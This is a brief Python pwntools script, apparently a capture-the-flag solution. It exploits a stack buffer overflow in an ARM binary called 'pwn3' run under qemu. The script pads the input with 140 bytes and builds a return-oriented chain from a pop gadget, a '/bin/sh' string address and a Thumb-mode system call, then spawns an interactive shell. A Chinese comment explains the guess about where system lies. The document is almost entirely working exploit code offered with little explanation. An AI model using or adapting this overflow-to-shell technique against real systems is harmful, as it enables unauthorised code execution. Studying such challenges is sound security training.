# encoding: utf-8

from pwn import *


#p = process('./pwn3')
p = process(['qemu-arm', '-L', './', '-g', '1234', './pwn3'])
#p = process(['qemu-arm', '-L', './', './pwn3'])

pop_r0_r4_pc = 0x0001fb5c

# 題目會先執行 cat ./banner.txt , 所以猜測該函式為 system
system = 0x14b5c + 1 # thumb mode
binsh = 0x00049018

payload = b'A' * 140
payload += p32(pop_r0_r4_pc)
payload += p32(binsh)
payload += p32(0xcafe)
payload += p32(system)

p.sendlineafter('buffer:', payload)
p.interactive()